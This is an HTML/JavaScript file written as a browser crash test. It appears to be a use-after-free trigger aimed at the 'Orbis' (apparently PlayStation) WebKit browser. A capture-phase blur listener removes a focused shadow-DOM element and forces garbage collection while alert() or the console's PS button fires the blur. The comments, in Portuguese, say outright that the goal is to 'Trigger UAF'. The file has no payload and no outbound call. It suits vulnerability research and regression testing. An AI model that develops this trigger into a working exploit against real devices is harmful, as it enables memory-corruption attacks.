<!DOCTYPE html>
<html>
<body>
<p>This test passes if it does not crash.</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

function log(msg) {
    var line = document.createElement('div');
    line.textContent = msg;
    result.appendChild(line);
}

// --- Setup ---
let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

// Telemetria correta: activeElement no shadow, não document.hasFocus()
var activeInShadow = host.shadowRoot.activeElement;
log('[Setup] victim focused: ' + (activeInShadow === victim));
log('[Setup] document.activeElement is host: ' + (document.activeElement === host));

// Listener correto: capture no document, pega blur do victim atravessando shadow boundary
document.addEventListener('blur', function onBlur(e) {
    log('[Blur] received — target: ' + e.target.tagName + ', composed: ' + e.composed);
    victim.remove();
    victim = null;
    gc();
    document.removeEventListener('blur', onBlur, true);
}, true);

// Tentativa de trigger via alert (nested run loop — pode funcionar no Orbis)
// O browser pode chamar setIsKey(false) ou setFocused(false) ao abrir o dialog nativo
setTimeout(function() {
    log('[Trigger] alert...');
    alert('Trigger UAF — feche este dialog');
    log('[After alert] victim is null: ' + (victim === null));
    if (victim === null)
        log('PASS — blur disparou durante alert()');
    else
        log('[Manual] Pressione botão PS ? XMB ? volte');
}, 500);

// Fallback: detectar quando o botão PS foi pressionado via visibilitychange
document.addEventListener('visibilitychange', function() {
    log('[Visibility] ' + document.visibilityState);
});

window.addEventListener('blur', function() {
    log('[Window] blur event on window object');
});
</script>
</body>
</html>
